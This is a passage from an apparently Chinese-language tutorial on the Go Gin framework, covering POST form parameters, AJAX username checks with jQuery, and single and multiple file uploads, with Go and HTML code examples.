class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br>r.StaticFS(<span class="hljs-string">&quot;/s&quot;</span>, http.Dir(<span class="hljs-string">&quot;static&quot;</span>))<br>    <br><span class="hljs-comment">// &quot;/&quot; 渲染FORM表单的HTML页面</span><br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, myfunc.Index)<br>    <br><span class="hljs-comment">// FORM表单提交到了&quot;showUserInfo&quot;路径,由myfunc.ShowUserInfo对POST数据进行处理</span><br>r.POST(<span class="hljs-string">&quot;/showUserInfo&quot;</span>, myfunc.ShowUserInfo)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><p>myfunc.Index</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>    <span class="hljs-comment">// 渲染FORM表单的HTML页面</span><br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>index.html</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402268.png" alt="image-20230403165050649"></p><p>myfunc.ShowUserInfo</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> PostForm(key <span class="hljs-type">string</span>) (value <span class="hljs-type">string</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ShowUserInfo</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>    <span class="hljs-comment">// 对index.html form 表单提交的数据作显示</span><br>username := context.PostForm(<span class="hljs-string">&quot;username&quot;</span>)<br>password := context.PostForm(<span class="hljs-string">&quot;pwd&quot;</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;username = %s password = %s\n&quot;</span>, username, password)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="获取POST数据"><a href="#获取POST数据" class="headerlink" title="获取POST数据"></a>获取POST数据</h3><h4 id="DefaultPostForm"><a href="#DefaultPostForm" class="headerlink" title="DefaultPostForm"></a>DefaultPostForm</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> DefaultPostForm(key <span class="hljs-type">string</span>, defaultValue <span class="hljs-type">string</span>) <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>作用：对于FORM表单中未定义的数据设置一个默认值</p><p>form表单中定义了<code>username</code>、<code>pwd</code>参数：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402175.png" alt="image-20230403170240171"></p><p>对 <code>username、pwd、age</code> 参数都定义默认值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ShowUserInfo</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>username := context.DefaultPostForm(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)<br>password := context.DefaultPostForm(<span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)<br>age := context.DefaultPostForm(<span class="hljs-string">&quot;age&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;username = %s password = %s age = %s\n&quot;</span>, username, password, age)<br>&#125;<br></code></pre></td></tr></table></figure><p>空表单提交：</p><p>只有 age 参数的默认值起作用</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402257.png" alt="image-20230403170419530" style="zoom:67%;" /><h4 id="PostFormArray"><a href="#PostFormArray" class="headerlink" title="PostFormArray"></a>PostFormArray</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> PostFormArray(key <span class="hljs-type">string</span>) (values []<span class="hljs-type">string</span>)<br></code></pre></td></tr></table></figure><p>相同的参数：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402452.png" alt="image-20230403171359388"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402537.png" alt="image-20230403171419194"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ShowUserInfo</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>hobbys := context.PostFormArray(<span class="hljs-string">&quot;Hobby&quot;</span>)<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hobbys = %v&quot;</span>, hobbys)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402204.png" alt="image-20230403171457930"></p><h4 id="PostFormMap"><a href="#PostFormMap" class="headerlink" title="PostFormMap"></a>PostFormMap</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> PostFormMap(key <span class="hljs-type">string</span>) (dicts <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402784.png" alt="image-20230403171904931"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402381.png" alt="image-20230403171913956"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ShowUserInfo</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>User := context.PostFormMap(<span class="hljs-string">&quot;User&quot;</span>)<br>context.JSON(<span class="hljs-number">200</span>, User)<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402715.png" alt="image-20230403172006268" style="zoom:67%;" /><h2 id="同步异步"><a href="#同步异步" class="headerlink" title="同步异步"></a>同步异步</h2><h3 id="同步交互"><a href="#同步交互" class="headerlink" title="同步交互"></a>同步交互</h3><p>浏览器工作 -&gt; 交给服务器 -&gt; 服务器处理完 -&gt; 浏览器 …</p><p>浏览器工作时，服务器空闲；</p><p>服务器工作时，浏览器也要等服务器工作完成。</p><p>在交替工作过程中无形之中造成的时间的浪费 ；</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051402270.png" alt="image-20230403172848119"></p><p>优点：</p><ul><li>可以保留浏览器后退按钮的正常功能。在动态更新页面的情况下，用户可以回到前一个页面状态，浏览器能记下历史记录中的静态页面,用户通常都希望单击后退按钮时，就能够取消他们的前一次操作，同步交互可以实现这个需求。</li></ul><p>缺点：</p><ol><li><p>同步交互的不足之处，会给用户一种不连贯的体验，当服务器处理请求时，用户只能等待状态，页面中的显示内容只能是空白。</p></li><li><p>因为已经跳转到新的页面,原本在页面上的信息无法保存,好多信息需要重新填写</p></li></ol><h3 id="异步交互"><a href="#异步交互" class="headerlink" title="异步交互"></a>异步交互</h3><p>和同步交换相反，浏览器在工作的时候，服务器就在进行相应的工作，不需要等待浏览器工作<strong>完成之后</strong>，服务器再<strong>开始工作</strong>。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403375.png" alt="image-20230403173344750"></p><p>在操作页面的过程中，就可以向服务器发送各种请求并且可以将信息返回给浏览器，浏览器不出现空闲等待的现象，该工作还是工作，互不影响，效率高 –&gt; 异步交互方法 ，可以减少用户话费的时间，提高用户的体验感。</p><p>优点：</p><ol><li><p>前端用户操作和后台服务器运算可以同时进行,可以充分利用用户操作的间隔时间完成运算</p></li><li><p>页面没有跳转,响应回来的数据直接就在原页面上,页面原有信息得以保留</p></li></ol><p>缺点</p><ul><li>可能破坏浏览器后退按钮的正常行为。</li><li>在动态更新页面的情况下，用户无法回到前一个页面状态，这是因为浏览器仅能记录的始终是当前一个的静态页面。</li><li>用户通常都希望单击后退按钮，就能够取消他们的前一次操作，但是在AJAX这样异步的程序，却无法这样做。</li></ul><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>AJAX 即 Asynchronous Javascript And XML（异步 JavaScript和 XML），是指一种创建交互式、快速动态网页应用的网页开发技术，无需重新加载整个网页的情况下，能够<strong>更新部分网页</strong>的技术。</p><p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。</p><p>这意味着可以在不重新加载整个网页的情况下，对网页的<strong>某部分</strong>进行更新。</p><p>AJAX的最大的特点： <strong>异步访问，局部刷新</strong></p><p>agax 在 jQuery 中，引入 jQuery 即可。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><blockquote><p>ajax之验证用户名是否被占用</p></blockquote><p>注册用户时，在输入用户名之后就检测用户名是否重复，而不是把信息输入完成提交之后再检测用户名是否重复。</p><p>实现原理：</p><ul><li>在用户输入完用户名，光标定位到密码的时候，就把用户名传递给后端，后端进行重复检测，之后返回。</li></ul><p>前端：</p><p>在用户名框失去焦点后，调用后端方法。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/html&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Register<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/s/css/mycss.css&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 引入 jQuery --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/s/js/jquery-3.6.3.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/register&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;uname&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;uname&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;errMsg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>    password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;register&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 获取用户名文本框</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> unametext = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;uname&quot;</span>);</span><br><span class="language-javascript">    <span class="hljs-comment">// 失去焦点时候,触发事件,执行后面的函数(也就是去请求/ajaxpost,后端去判断用户名重复)</span></span><br><span class="language-javascript">    unametext.<span class="hljs-property">onblur</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">var</span> uname = unametext.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">      <span class="hljs-comment">// JSON格式的参数:$.ajax(&#123;属性名:属性值,属性名:属性值,方法名:方法&#125;)</span></span><br><span class="language-javascript">      $.<span class="hljs-title function_">ajax</span>(</span><br><span class="language-javascript">              &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;/ajaxpost&quot;</span>,  <span class="hljs-comment">// 请求路由</span></span><br><span class="language-javascript">                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-comment">// 请求类型</span></span><br><span class="language-javascript">                <span class="hljs-attr">data</span>:&#123;  <span class="hljs-comment">// 向后端发送的数据</span></span><br><span class="language-javascript">                  <span class="hljs-string">&quot;uname&quot;</span>:uname</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">info</span>)&#123;  <span class="hljs-comment">// 后台响应成功时调用的函数,形参info是自定义的,它表示后端传递过滤的消息</span></span><br><span class="language-javascript">                    <span class="hljs-comment">// 定位errMsg,将后端传递过来的数据显示到这个span中</span></span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;errMsg&quot;</span>).<span class="hljs-property">innerText</span> = info[<span class="hljs-string">&quot;msg&quot;</span>]</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">fail</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;  <span class="hljs-comment">// 后台响应失败时调用的函数</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">              &#125;</span><br><span class="language-javascript">      )</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Go：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br>r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;static&quot;</span>)<br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, myfunc.Index)<br><span class="hljs-comment">// ajax 处理路由</span><br>r.POST(<span class="hljs-string">&quot;/ajaxpost&quot;</span>, myfunc.Repeat)<br>r.POST(<span class="hljs-string">&quot;/register&quot;</span>, myfunc.Register)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Repeat</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>uname := context.PostForm(<span class="hljs-string">&quot;uname&quot;</span>)<br><span class="hljs-keyword">if</span> uname == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>        <span class="hljs-comment">// 向前端传送JSON数据</span><br>context.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名已经被注册!&quot;</span>,<br>&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>context.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>gin.H{}</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// H is a shortcut for map[string]interface&#123;&#125;</span><br><span class="hljs-keyword">type</span> H <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any<br></code></pre></td></tr></table></figure><p>底层发送JSON数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">msgdata := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>any -&gt; interface{}</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="FORM表单"><a href="#FORM表单" class="headerlink" title="FORM表单"></a>FORM表单</h3><h4 id="单个文件"><a href="#单个文件" class="headerlink" title="单个文件"></a>单个文件</h4><p>前端：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/save&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>method&#x3D;”post”</li><li>enctype&#x3D;”multipart&#x2F;form-data”</li><li>type&#x3D;”file”</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403707.png" alt="image-20230403201243826"></p><p>后端：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/upload&quot;</span>, myfunc.Upload)<span class="hljs-comment">// GET渲染HTML页面</span><br>r.POST(<span class="hljs-string">&quot;/save&quot;</span>, myfunc.Save)<span class="hljs-comment">// POST对文件进行保存</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Upload</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;uploadfile.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Save</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-comment">// 接收文件</span><br>myfile, err := context.FormFile(<span class="hljs-string">&quot;myfile&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;error: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 时间戳字符串作为保存文件名前缀,防止同名文件替换</span><br>timestamp := strconv.FormatInt(time.Now().Unix(), <span class="hljs-number">10</span>)<br><span class="hljs-comment">// 保存文件</span><br>ferr := context.SaveUploadedFile(myfile, <span class="hljs-string">&quot;./uploadfiles/&quot;</span>+timestamp+myfile.Filename)<br><span class="hljs-keyword">if</span> ferr != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;上传失败:%v&quot;</span>, ferr)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;上传成功&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过 <code>FormFile</code> 接收前端FORM传递的文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> FormFile(name <span class="hljs-type">string</span>) (*multipart.FileHeader, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>*multipart.FileHeader：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403374.png" alt="image-20230403195213630"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> SaveUploadedFile(file *multipart.FileHeader, dst <span class="hljs-type">string</span>) <span class="hljs-type">error</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051407830.png" alt="image-20230403202305168"></p><h4 id="多个文件"><a href="#多个文件" class="headerlink" title="多个文件"></a>多个文件</h4><p>多个相同name的文件上传：（ 如果是不同的，直接多个 <code>context.FormFile</code> 即可 ）</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403385.png" alt="image-20230403203308426"></p><p>后端：</p><p>获取表单：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Context)</span></span> MultipartForm() (*multipart.Form, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>获取表单的<code>File</code>：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403051.png" alt="image-20230403203411031"></p><p>遍历<code>File</code>获取其value进行保存。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Saves</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-comment">// 接收表单</span><br>form, err := context.MultipartForm()<br><span class="hljs-comment">// 在表单中获取相同name的文件</span><br>files := form.File[<span class="hljs-string">&quot;myfile&quot;</span>]<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;error: %v&quot;</span>, err)<br>&#125;<br>timestamp := strconv.FormatInt(time.Now().Unix(), <span class="hljs-number">10</span>)<br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>context.SaveUploadedFile(file, <span class="hljs-string">&quot;./uploadfiles/&quot;</span>+timestamp+file.Filename)<br>&#125;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;上传成功&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403722.png" alt="image-20230403203809053"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403161.png" alt="image-20230403203833783"></p><h3 id="AGAX"><a href="#AGAX" class="headerlink" title="AGAX"></a>AGAX</h3><h4 id="单个文件-1"><a href="#单个文件-1" class="headerlink" title="单个文件"></a>单个文件</h4><p>前端：</p><p>在点击提交时，ajax 传递文件给后端。</p><p>使用 ajax 传递文件需要设置两个参数：            </p><ul><li>contentType:false -&gt; 默认为true，当设置为true的时候，jquery ajax 提交的时候不会序列化 data，而是直接使用data</li><li>processData:false, -&gt; 目的是防止上传文件中出现分界符导致服务器无法正确识别文件起始位置</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 